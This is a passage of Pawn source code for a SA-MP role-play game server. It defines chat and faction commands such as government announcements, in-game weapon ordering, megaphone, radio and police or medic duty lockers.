			    	format(string, sizeof(string), "* Chief LSPD %s: %s", sendername, textgov);
				}
				if(PlayerInfo[playerid][pRank] == 6)
				{
			    	format(string, sizeof(string), "* Assistant Chief LSPD %s: %s", sendername, textgov);
				}
				if(PlayerInfo[playerid][pRank] == 5)
				{
			    	format(string, sizeof(string), "* Captain LSPD %s: %s", sendername, textgov);
				}
			}
  			if(PlayerInfo[playerid][pMember] == 2)
		    {
		        SendClientMessageToAll(COLOR_TEAL, "------ Government Announcement (Federal Bureau of Investigations) ------");
				if(PlayerInfo[playerid][pRank] == 7)
				{
		        	format(string, sizeof(string), "* Director FBI %s: %s", sendername, textgov);
				}
				if(PlayerInfo[playerid][pRank] == 6)
				{
		        	format(string, sizeof(string), "* Assistant Director FBI %s: %s", sendername, textgov);
				}
				if(PlayerInfo[playerid][pRank] == 5)
				{
		        	format(string, sizeof(string), "* Section Chief FBI %s: %s", sendername, textgov);
				}
		    }
		    if(PlayerInfo[playerid][pMember] == 3)
		    {
		        SendClientMessageToAll(COLOR_TEAL, "------ Government Announcement (National Guard) ------");
				if(PlayerInfo[playerid][pRank] == 7)
				{
		        	format(string, sizeof(string), "* General National Guard %s: %s", sendername, textgov);
				}
				if(PlayerInfo[playerid][pRank] == 6)
				{
		        	format(string, sizeof(string), "* Colonel National Guard %s: %s", sendername, textgov);
				}
				if(PlayerInfo[playerid][pRank] == 5)
				{
		        	format(string, sizeof(string), "* Major National Guard %s: %s", sendername, textgov);
				}
		    }
		    if(PlayerInfo[playerid][pMember] == 8)
		    {
		        SendClientMessageToAll(COLOR_TEAL, "------ Government Announcement (Las Venturas Police Department) ------");
		        if(PlayerInfo[playerid][pRank] == 7)
				{
			    	format(string, sizeof(string), "* Chief LVPD %s: %s", sendername, textgov);
				}
				if(PlayerInfo[playerid][pRank] == 6)
				{
			    	format(string, sizeof(string), "* Assistant Chief LVPD %s: %s", sendername, textgov);
				}
				if(PlayerInfo[playerid][pRank] == 5)
				{
			    	format(string, sizeof(string), "* Captain LVPD %s: %s", sendername, textgov);
				}
		    }
		    if(PlayerInfo[playerid][pMember] == 15)
		    {
		        SendClientMessageToAll(COLOR_TEAL, "------ Government Announcement (San Fierro Police Department) ------");
		        if(PlayerInfo[playerid][pRank] == 7)
				{
			    	format(string, sizeof(string), "* Chief SFPD %s: %s", sendername, textgov);
				}
				if(PlayerInfo[playerid][pRank] == 6)
				{
			    	format(string, sizeof(string), "* Assistant Chief SFPD %s: %s", sendername, textgov);
				}
				if(PlayerInfo[playerid][pRank] == 5)
				{
			    	format(string, sizeof(string), "* Captain SFPD %s: %s", sendername, textgov);
				}
		    }
		    if(PlayerInfo[playerid][pMember] == 14)
		    {
		        SendClientMessageToAll(COLOR_TEAL, "------ Government Announcement (Paramedic Department) ------");
		        if(PlayerInfo[playerid][pRank] == 7)
				{
			    	format(string, sizeof(string), "* Chief Paramedic %s: %s", sendername, textgov);
				}
				if(PlayerInfo[playerid][pRank] == 6)
				{
			    	format(string, sizeof(string), "* Assistant Chief Paramedic %s: %s", sendername, textgov);
				}
				if(PlayerInfo[playerid][pRank] == 5)
				{
			    	format(string, sizeof(string), "* Paramedic Field Chief %s: %s", sendername, textgov);
				}
		    }
	    	SendClientMessageToAll(COLOR_BLUE, string);
		}
        else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a Cop/Paramedic.");
 	}
	return 1;
}
CMD:gov(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	return cmd_government(playerid, params);
}
CMD:order(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
        if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4 || PlayerInfo[playerid][pMember] == 5 || PlayerInfo[playerid][pLeader] == 5 ||
		PlayerInfo[playerid][pMember] == 6 || PlayerInfo[playerid][pLeader] == 6 || PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pLeader] == 10)
        {
			if(PlayerInfo[playerid][pGunLic] == 0) return SendClientMessage(playerid, COLOR_SERVER,"{FFB870}You don't have gun license.");
			if(GetPlayerInterior(playerid) == 0) return SendClientMessage(playerid, COLOR_SERVER,"{3385FF}You are not in place to get guns.");
		    if(IsAtOrderPlace(playerid))
            {
	    	    new x_nr[50],
	    	    	x = PlayerInfo[playerid][pMember];
		        if(sscanf(params, "s[50]",x_nr))
		        {
	    	  	    SendClientMessage(playerid, COLOR_SERVER, "Usage: /order [1-7]");
		        	SendClientMessage(playerid, COLOR_SERVER, "(1) Deagle | (2) Shotgun | (3) AK47");
		        	SendClientMessage(playerid, COLOR_SERVER, "(4) MP5 | (5) Rifle | (6) Katana");
		        	SendClientMessage(playerid, COLOR_SERVER, "(7) M4 - Rank 2");
		        	SendClientMessage(playerid, COLOR_SERVER, "(8) M4, CombatShotgun, Tec9 - Rank 5");
		        	return 1;
	        	}
                if(strcmp(x_nr,"1",true) == 0)
             	{
                    if(DynamicFactions[x][fMats] <= 119) return SendClientMessage(playerid, COLOR_SERVER,"Mafia ta nu detine 120 de materiale pentru a creea aceasta arma.");
     	        	if(GetPlayerCash(playerid) <= 1199) return SendClientMessage(playerid, COLOR_SERVER,"Nu ai $1200.");
					GivePlayerWeaponEx(playerid, 24, 200);
					DynamicFactions[x][fMats] -= 120;
					DynamicFactions[x][fBank] += 1200;
					GivePlayerCash(playerid, -1200);
					Update(playerid, pCashx);
					PlayerInfo[playerid][pMUsed] += 120;
					Update(playerid,pMUsedx);
					new str2[184];
					mysql_format(SQL,str2,sizeof(str2),"UPDATE `factions` SET `Bank`='%d',`Mats`='%d' WHERE `ID`='%d'",DynamicFactions[x][fBank],DynamicFactions[x][fMats],x);
					mysql_tquery(SQL,str2,"","");
					SendClientMessage(playerid, COLOR_SERVER,"You bought a Deagle for $1,200. 120 faction material taken from the vault.");
		           	return 1;
      	        }
                if(strcmp(x_nr,"2",true) == 0)
             	{
					if(DynamicFactions[x][fMats] <= 149) return SendClientMessage(playerid, COLOR_SERVER,"Your Mafia has not 150 materials to create this weapon.");
     	        	if(GetPlayerCash(playerid) <= 1499) return SendClientMessage(playerid, COLOR_SERVER,"Not Have $1500.");
          	        GivePlayerWeaponEx(playerid, 25, 200);
					DynamicFactions[x][fMats] -= 150;
					DynamicFactions[x][fBank] += 1500;
					GivePlayerCash(playerid, -1500);
					Update(playerid, pCashx);
					PlayerInfo[playerid][pMUsed] += 150;
					Update(playerid,pMUsedx);
					new str2[184];
					mysql_format(SQL,str2,sizeof(str2),"UPDATE `factions` SET `Bank`='%d',`Mats`='%d' WHERE `ID`='%d'",DynamicFactions[x][fBank],DynamicFactions[x][fMats],x);
					mysql_tquery(SQL,str2,"","");
					SendClientMessage(playerid, COLOR_SERVER,"You bought a Shotgun for $1,500. 150 faction material taken from the vault.");
         			return 1;
				}
	        	if(strcmp(x_nr,"3",true) == 0)
             	{
					if(DynamicFactions[x][fMats] <= 199) return SendClientMessage(playerid, COLOR_SERVER,"Your Mafia has not 200 de materials to create this weapon.");
     	        	if(GetPlayerCash(playerid) <= 1999) return SendClientMessage(playerid, COLOR_SERVER,"Not Have $2000.");
              		GivePlayerWeaponEx(playerid, 30, 200);
					DynamicFactions[x][fMats] -= 200;
					DynamicFactions[x][fBank] += 2000;
					GivePlayerCash(playerid, -2000);
					Update(playerid, pCashx);
					PlayerInfo[playerid][pMUsed] += 200;
					Update(playerid,pMUsedx);
					new str2[184];
					mysql_format(SQL,str2,sizeof(str2),"UPDATE `factions` SET `Bank`='%d',`Mats`='%d' WHERE `ID`='%d'",DynamicFactions[x][fBank],DynamicFactions[x][fMats],x);
					mysql_tquery(SQL,str2,"","");
					SendClientMessage(playerid, COLOR_SERVER,"You bought an AK47 for $2,000. 200 faction material taken from the vault.");
		         	return 1;
		        }
         		if(strcmp(x_nr,"4",true) == 0)
              	{
					if(DynamicFactions[x][fMats] <= 149) return SendClientMessage(playerid, COLOR_SERVER,"Your Mafia does not own 150 materials to create this weapon.");
     	        	if(GetPlayerCash(playerid) <= 1499) return SendClientMessage(playerid, COLOR_SERVER,"Not Have $1500.");
                    GivePlayerWeaponEx(playerid, 29, 200);
					DynamicFactions[x][fMats] -= 150;
					DynamicFactions[x][fBank] += 1500;
					GivePlayerCash(playerid, -1500);
					Update(playerid, pCashx);
					PlayerInfo[playerid][pMUsed] += 150;
					Update(playerid,pMUsedx);
					new str2[184];
					mysql_format(SQL,str2,sizeof(str2),"UPDATE `factions` SET `Bank`='%d',`Mats`='%d' WHERE `ID`='%d'",DynamicFactions[x][fBank],DynamicFactions[x][fMats],x);
					mysql_tquery(SQL,str2,"","");
					SendClientMessage(playerid, COLOR_SERVER,"You bought an MP5 to $1,500. 150 faction material taken from the vault.");
		         	return 1;
		        }
		        if(strcmp(x_nr,"5",true) == 0)
              	{
					if(DynamicFactions[x][fMats] <= 149) return SendClientMessage(playerid, COLOR_SERVER,"Your Mafia does not own 150 materials to create this weapon.");
     	        	if(GetPlayerCash(playerid) <= 1499) return SendClientMessage(playerid, COLOR_SERVER,"Not have $1500.");
                    GivePlayerWeaponEx(playerid, 33, 200);
					DynamicFactions[x][fMats] -= 150;
					DynamicFactions[x][fBank] += 1500;
					GivePlayerCash(playerid, -1500);
					Update(playerid, pCashx);
					PlayerInfo[playerid][pMUsed] += 150;
					Update(playerid,pMUsedx);
					new str2[184];
					mysql_format(SQL,str2,sizeof(str2),"UPDATE `factions` SET `Bank`='%d',`Mats`='%d' WHERE `ID`='%d'",DynamicFactions[x][fBank],DynamicFactions[x][fMats],x);
					mysql_tquery(SQL,str2,"","");
					SendClientMessage(playerid, COLOR_SERVER,"You bought a rifle for $ 1,500. 150 faction material taken from the vault.");
		         	return 1;
		        }
		        if(strcmp(x_nr,"6",true) == 0)
              	{
					if(DynamicFactions[x][fMats] <= 99) return SendClientMessage(playerid, COLOR_SERVER,"Your Mafia does not own 100 materials to create this weapon.");
     	        	if(GetPlayerCash(playerid) <= 999) return SendClientMessage(playerid, COLOR_SERVER,"Not Have $1000.");
                    GivePlayerWeaponEx(playerid, 8, 1);
					DynamicFactions[x][fMats] -= 100;
					DynamicFactions[x][fBank] += 1000;
					GivePlayerCash(playerid, -1000);
					PlayerInfo[playerid][pMUsed] += 100;
					Update(playerid,pMUsedx);
					Update(playerid, pCashx);
					new str2[184];
					mysql_format(SQL,str2,sizeof(str2),"UPDATE `factions` SET `Bank`='%d',`Mats`='%d' WHERE `ID`='%d'",DynamicFactions[x][fBank],DynamicFactions[x][fMats],x);
					mysql_tquery(SQL,str2,"","");
					SendClientMessage(playerid, COLOR_SERVER,"You bought a Katana for $ 1,000. 100 faction material taken from the vault.");
		         	return 1;
		        }
				if(PlayerInfo[playerid][pRank] >= 2)
				{
				    if(strcmp(x_nr,"7",true) == 0)
              		{
					if(DynamicFactions[x][fMats] <= 199) return SendClientMessage(playerid, COLOR_SERVER,"Your Mafia does not own 200 materials to create this weapon.");
     	        	if(GetPlayerCash(playerid) <= 1999) return SendClientMessage(playerid, COLOR_SERVER,"Not Have $2000.");
        			GivePlayerWeaponEx(playerid, 31, 200);
					DynamicFactions[x][fMats] -= 200;
					DynamicFactions[x][fBank] += 2000;
					GivePlayerCash(playerid, -2000);
					Update(playerid, pCashx);
					PlayerInfo[playerid][pMUsed] += 200;
					Update(playerid,pMUsedx);
					new str2[184];
					mysql_format(SQL,str2,sizeof(str2),"UPDATE `factions` SET `Bank`='%d',`Mats`='%d' WHERE `ID`='%d'",DynamicFactions[x][fBank],DynamicFactions[x][fMats],x);
					mysql_tquery(SQL,str2,"","");
					SendClientMessage(playerid, COLOR_SERVER,"You bought a M4 for $ 2,000. 200 material taken from the vault faction.");
			        return 1;
		        	}
				}
				if(PlayerInfo[playerid][pRank] >= 5)
				{
				    if(strcmp(x_nr,"8",true) == 0)
              		{
					if(DynamicFactions[x][fMats] <= 199) return SendClientMessage(playerid, COLOR_SERVER,"Your Mafia does not own 200 materials to create this weapon.");
     	        	if(GetPlayerCash(playerid) <= 1999) return SendClientMessage(playerid, COLOR_SERVER,"Not Have $2000.");
        			GivePlayerWeaponEx(playerid, 31, 200);
					DynamicFactions[x][fMats] -= 1000;
					DynamicFactions[x][fBank] += 6000;
					GivePlayerCash(playerid, -6000);
					Update(playerid, pCashx);
					GivePlayerWeaponEx(playerid, 27, 150);
					GivePlayerWeaponEx(playerid, 32, 200);
					PlayerInfo[playerid][pMUsed] += 1000;
					Update(playerid,pMUsedx);
					new str2[184];
					mysql_format(SQL,str2,sizeof(str2),"UPDATE `factions` SET `Bank`='%d',`Mats`='%d' WHERE `ID`='%d'",DynamicFactions[x][fBank],DynamicFactions[x][fMats],x);
					mysql_tquery(SQL,str2,"","");
					SendClientMessage(playerid, COLOR_SERVER,"You bought M4 Combat Shotgun and Tec9 for $ 6,000. 1000 faction material taken from the vault.");
			        return 1;
		        	}
				}
            }
	        else
	        {
	        	SCM(playerid, COLOR_SERVER,"{3385FF}You are not in place to get guns.");
	        	return 1;
            }
        }
	    else if(PlayerInfo[playerid][pMember] == 11)
	    {
	        if(PlayerInfo[playerid][pGunLic] == 0) return SendClientMessage(playerid, COLOR_SERVER,"{FFB870}You don't have gun license.");
			if(GetPlayerInterior(playerid) == 0) return SendClientMessage(playerid, COLOR_SERVER,"{3385FF}You are not in place to get guns.");
		    if(IsPlayerInRangeOfPoint(playerid, 50.0, 2323.9993,-1148.0469,1050.7101) && GetPlayerVirtualWorld(playerid) == 2)
            {
                new x_nr[50],
	    	    	x = PlayerInfo[playerid][pMember];
		        if(sscanf(params, "s[50]",x_nr))
		        {
	    	  	    SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/order [item]");
		        	SendClientMessage(playerid, COLOR_SERVER, "{FF9900}1 - sniper, 2 - rifle. price: $1000");
		        	return 1;
	        	}
	        	if(strcmp(x_nr,"1",true) == 0)
             	{
                    if(GetPlayerMoney(playerid) >= 1000)
                    {
                        GivePlayerWeaponEx(playerid, 4, 1);
     	        		GivePlayerWeaponEx(playerid, 23, 50);
     	        		GivePlayerWeaponEx(playerid, 34, 50);
     	        		GivePlayerCash(playerid, -1000);
						DynamicFactions[x][fBank] += 1000;
     	        		Update(playerid, pCashx);
						new str2[184];
						mysql_format(SQL,str2,sizeof(str2),"UPDATE `factions` SET `Bank`='%d' WHERE `ID`='%d'",DynamicFactions[x][fBank],x);
						mysql_tquery(SQL,str2,"","");
		        	}
	        		else
	        		{
		        		SCM(playerid, COLOR_SERVER,"Nu ai $1000.");
                    }
		           	return 1;
      	        }
      	        if(strcmp(x_nr,"2",true) == 0)
             	{
                    if(GetPlayerMoney(playerid) >= 1000)
                    {
                        GivePlayerWeaponEx(playerid, 4, 1);
     	        		GivePlayerWeaponEx(playerid, 23, 50);
     	        		GivePlayerWeaponEx(playerid, 33, 50);
     	        		GivePlayerCash(playerid, -1000);
						DynamicFactions[x][fBank] += 1000;
     	        		Update(playerid, pCashx);
						new str2[184];
						mysql_format(SQL,str2,sizeof(str2),"UPDATE `factions` SET `Bank`='%d' WHERE `ID`='%d'",DynamicFactions[x][fBank],x);
						mysql_tquery(SQL,str2,"","");
		        	}
	        		else
	        		{
		        		SCM(playerid, COLOR_SERVER,"Nu ai $1000.");
                    }
		           	return 1;
      	        }
			}
			else
	        {
	        	SCM(playerid, COLOR_SERVER,"{3385FF}You are not in place to get guns.");
	        	return 1;
            }
		}
	}
    return 1;
}
CMD:megaphone(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new tmpcar = GetPlayerVehicleID(playerid),textmeg[250],sendername[MAX_PLAYER_NAME],string[200];
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(PlayerInfo[playerid][pMuted] == 1)
	    {
			format(string, sizeof(string), "You can not speak, you have been silenced for %d seconds.",PlayerInfo[playerid][pMuteTime]);
			SendClientMessage(playerid, COLOR_ERROR, string);
			return 1;
		}
		if(sscanf(params, "s[250]", textmeg)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/m <Message>");
		if(FindIP(textmeg)) /// Anti-Reclama
        {
	        new advertiser[MAX_PLAYER_NAME];
	        GetPlayerName(playerid, advertiser, sizeof(advertiser));
	        format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /m.", advertiser, playerid, textmeg);
			ABroadCast(COLOR_SERVER,string,1);
        }
        for(new i; i < sizeof(TLD); i++)
		{
			if(strfind(textmeg, TLD[i], true) != -1)
			{
				if(strfind(textmeg, "wwww.Magic-Gaming.tk", true) != -1 || strfind(textmeg, "wwww.Magic-Gaming.tk/forum", true) != -1 || strfind(textmeg, "Magic-Gaming.tk", true) != -1) break;
				new advertiser[MAX_PLAYER_NAME];
				GetPlayerName(playerid, advertiser, sizeof(advertiser));
				format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /m.", advertiser, playerid, textmeg);
				ABroadCast(COLOR_SERVER,string,1);
			}
		}
		if(IsACop(playerid))
		{
			if(!Copcar2(tmpcar)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not in a Police Vehicle.");
			if(PlayerInfo[playerid][pMember] == 1||PlayerInfo[playerid][pLeader] == 1)
			{
				format(string, sizeof(string), "(megaphone) Policeman %s: %s", sendername, textmeg);
				ProxDetector(60.0, playerid, string,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
			}
			else if(PlayerInfo[playerid][pMember] == 2||PlayerInfo[playerid][pLeader] == 2)
			{
				format(string, sizeof(string), "(megaphone) Agent %s: %s", sendername, textmeg);
				ProxDetector(60.0, playerid, string,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
			}
			else if(PlayerInfo[playerid][pMember] == 3||PlayerInfo[playerid][pLeader] == 3)
			{
				format(string, sizeof(string), "(megaphone) Soldier %s: %s", sendername, textmeg);
				ProxDetector(60.0, playerid, string,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
			}
			else if(PlayerInfo[playerid][pMember] == 8||PlayerInfo[playerid][pLeader] == 8)
			{
				format(string, sizeof(string), "(megaphone) Policeman %s: %s", sendername, textmeg);
				ProxDetector(60.0, playerid, string,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
			}
			else if(PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pLeader] == 15)
			{
				format(string, sizeof(string), "(megaphone) Policeman %s: %s", sendername, textmeg);
				ProxDetector(60.0, playerid, string,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
			}
			printf("%s", string);
		}
		else
		{
			SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a cop.");
			return 1;
		}
	}
	return 1;
}
CMD:m(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	return cmd_megaphone(playerid, params);
}
CMD:radio(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new radiomsj[250],sendername[MAX_PLAYER_NAME],string[256],member = PlayerInfo[playerid][pMember],leader = PlayerInfo[playerid][pLeader];
	    if(PlayerInfo[playerid][pMuted] == 1)
	    {
			format(string, sizeof(string), "You can not speak, you have been silenced for %d seconds.",PlayerInfo[playerid][pMuteTime]);
			SendClientMessage(playerid, COLOR_ERROR, string);
			return 1;
		}
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(sscanf(params, "s[250]", radiomsj)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/r <Message>");
		if(FindIP(radiomsj)) /// Anti-Reclama
        {
	        new advertiser[MAX_PLAYER_NAME];
	        GetPlayerName(playerid, advertiser, sizeof(advertiser));
	        format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /r.", advertiser, playerid, radiomsj);
			ABroadCast(COLOR_SERVER,string,1);
        }
        for(new i; i < sizeof(TLD); i++)
		{
			if(strfind(radiomsj, TLD[i], true) != -1)
			{
				if(strfind(radiomsj, "wwww.Magic-Gaming.tk", true) != -1 || strfind(radiomsj, "wwww.Magic-Gaming.tk/forum", true) != -1 || strfind(radiomsj, "Magic-Gaming.tk", true) != -1) break;
				new advertiser[MAX_PLAYER_NAME];
				GetPlayerName(playerid, advertiser, sizeof(advertiser));
				format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /r.", advertiser, playerid, radiomsj);
				ABroadCast(COLOR_SERVER,string,1);
			}
		}
		if(member == 1 || leader == 1 || member == 2 || leader == 2 || member == 3 || leader == 3 || member == 8 || leader == 8 || member == 15 || leader == 15)
		{
			if(PlayerInfo[playerid][pRank] == 7) { format(string, sizeof(string), "*** %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName7], sendername, radiomsj); }
			else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "*** %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName6], sendername, radiomsj); }
			else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName5], sendername, radiomsj); }
			else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "* %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName4], sendername, radiomsj); }
			else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "* %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName3], sendername, radiomsj); }
			else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "* %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName2], sendername, radiomsj); }
			else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "* %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName1], sendername, radiomsj); }
			else
			{
				format(string, sizeof(string), "* %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName1], sendername, radiomsj);
			}
			SendRadioMessage(member, COLOR_RADIO, string);
			printf("%s", string);
			format(string, sizeof(string), "(radio) ''%s''",params);
    		SetPlayerChatBubble(playerid, string, COLOR_CHATBUBBLE, 10.0, 10000);
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Your group data is invalid.");
			return 1;
		}
	}
	return 1;
}
CMD:r(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	return cmd_radio(playerid, params);
}
CMD:duty(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
        if(PlayerInfo[playerid][pGunLic] == 0) return SendClientMessage(playerid, COLOR_SERVER,"{FFB870}You don't have gun license.");
		new house = PlayerInfo[playerid][pPhousekey],string[200],sendername[MAX_PLAYER_NAME];
		new house2 = PlayerInfo[playerid][pPhousekey2];
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(IsACop(playerid))
		{
			if(PlayerInfo[playerid][pLocal] == house || PlayerInfo[playerid][pLocal] == house2 || IsPlayerInRangeOfPoint(playerid, 150.0, 245.8297,112.4436,1003.2188) || IsPlayerInRangeOfPoint(playerid, 150.0, 236.3031,162.9478,1003.0300))
			{
				if(GetPlayerInterior(playerid) != 0)
				{
					if(OnDuty[playerid] == 0)
			        {
	               		if(PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1)
		             	{
				      		format(string, sizeof(string), "* Officer %s took a Badge and a Gun from his locker.", sendername);
							ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
							GivePlayerWeaponEx(playerid, 24, 500);
							GivePlayerWeaponEx(playerid, 3, 1);
							GivePlayerWeaponEx(playerid, 41, 500);
							GivePlayerWeaponEx(playerid, 29, 1000);
							GivePlayerWeaponEx(playerid, 31, 1000);
							SetPlayerArmourEx(playerid, 100);
       						SetPlayerHealthEx(playerid, 100);
							OnDuty[playerid] = 1;
						}
						if(PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2)
		            	{
				      		format(string, sizeof(string), "* Officer %s took a Badge and a Gun from his locker.", sendername);
							ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
							GivePlayerWeaponEx(playerid, 24, 500);
							GivePlayerWeaponEx(playerid, 3, 1);
							GivePlayerWeaponEx(playerid, 41, 500);
							GivePlayerWeaponEx(playerid, 29, 1000);
							GivePlayerWeaponEx(playerid, 31, 1000);
							SetPlayerArmourEx(playerid, 100);
							SetPlayerHealthEx(playerid, 100);
							OnDuty[playerid] = 1;
						}
						if(PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3)
		            	{
				      		format(string, sizeof(string), "* Officer %s took a Badge and a Gun from his locker.", sendername);
							ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
							GivePlayerWeaponEx(playerid, 24, 500);
							GivePlayerWeaponEx(playerid, 41, 500);
							GivePlayerWeaponEx(playerid, 29, 1000);
							GivePlayerWeaponEx(playerid, 31, 1000);
							SetPlayerArmourEx(playerid, 100);
							SetPlayerHealthEx(playerid, 100);
							OnDuty[playerid] = 1;
						}
						if(PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8)
		            	{
				      		format(string, sizeof(string), "* Officer %s took a Badge and a Gun from his locker.", sendername);
							ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
							GivePlayerWeaponEx(playerid, 24, 500);
							GivePlayerWeaponEx(playerid, 3, 1);
							GivePlayerWeaponEx(playerid, 41, 500);
							GivePlayerWeaponEx(playerid, 29, 1000);
							GivePlayerWeaponEx(playerid, 31, 1000);
							SetPlayerArmourEx(playerid, 100);
       						SetPlayerHealthEx(playerid, 100);
							OnDuty[playerid] = 1;
						}
						if(PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pLeader] == 15)
		            	{
				      		format(string, sizeof(string), "* Officer %s took a Badge and a Gun from his locker.", sendername);
							ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
							GivePlayerWeaponEx(playerid, 24, 500);
							GivePlayerWeaponEx(playerid, 3, 1);
							GivePlayerWeaponEx(playerid, 41, 500);
							GivePlayerWeaponEx(playerid, 29, 1000);
							GivePlayerWeaponEx(playerid, 31, 1000);
							SetPlayerArmourEx(playerid, 100);
       						SetPlayerHealthEx(playerid, 100);
							OnDuty[playerid] = 1;
						}
					}
					else if(OnDuty[playerid]==1)
					{
						format(string, sizeof(string), "* Officer %s places his Badge and Gun in his locker.", sendername);
						ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						OnDuty[playerid] = 0;
						SetPlayerArmourEx(playerid, 0);
						ResetPlayerWeaponsEx(playerid);
						ResetPlayerWeapons(playerid);
					}
	    		}
       			else
		    	{
					SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not in a locker room/your house.");
					return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not in a locker room/your house.");
				return 1;
			}
		}
		else if(PlayerInfo[playerid][pMember] == 14 || PlayerInfo[playerid][pLocal] == house)
		{
		    if(IsPlayerInRangeOfPoint(playerid, 50.0, 1494.7902,1306.6029,1093.2947))
		    {
		        if(PlayerInfo[playerid][pMember] != 14) return SendClientMessage(playerid, COLOR_ERROR, "You are not a medic.");
		        if(OnDutymedic[playerid] == 0)
			    {
			        format(string, sizeof(string), "* Medic %s took a Health Kit and a Fire Extinguisher from his locker.", sendername);
			        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerWeaponEx(playerid, 42, 1000);
					OnDutymedic[playerid] = 1;
				}
				else if(OnDutymedic[playerid] > 0)
				{
				    format(string, sizeof(string), "* Medic %s places his Health Kit and Fire Extinguisher in his locker.", sendername);
				    ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				    OnDutymedic[playerid] = 0;
				}
			}
   		}
	}
	return 1;
}
CMD:departments(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new string[256],sendername[MAX_PLAYER_NAME],depmsj[250],member = PlayerInfo[playerid][pMember],leader = PlayerInfo[playerid][pLeader];
	    if(PlayerInfo[playerid][pMuted] == 1)
	    {
			format(string, sizeof(string), "You can not speak, you have been silenced for %d seconds.",PlayerInfo[playerid][pMuteTime]);
			SendClientMessage(playerid, COLOR_ERROR, string);
